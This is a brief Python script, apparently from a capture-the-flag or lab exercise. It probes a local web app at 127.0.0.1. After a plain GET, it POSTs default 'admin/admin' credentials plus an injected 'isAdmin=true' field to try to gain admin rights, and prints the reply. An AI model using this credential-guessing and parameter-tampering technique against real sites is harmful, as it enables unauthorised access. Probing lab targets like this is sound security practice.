import requests

url = "http://127.0.0.1:32829/index.php"

print("[*] Attempting single request test...")

try:
    response = requests.get(url, timeout=5)
    print(f"Success! Status: {response.status_code}, Length: {len(response.text)}")
except Exception as e:
    print(f"Error: {type(e).__name__}: {e}")

print("\n[*] Attempting POST with isAdmin=true...")

try:
    data = {"username": "admin", "password": "admin", "isAdmin": "true"}
    response = requests.post(url, data=data, timeout=5)
    print(f"Status: {response.status_code}")
    print(f"Length: {len(response.text)}")
    print(f"Response:\n{response.text}")
except Exception as e:
    print(f"Error: {type(e).__name__}: {e}")

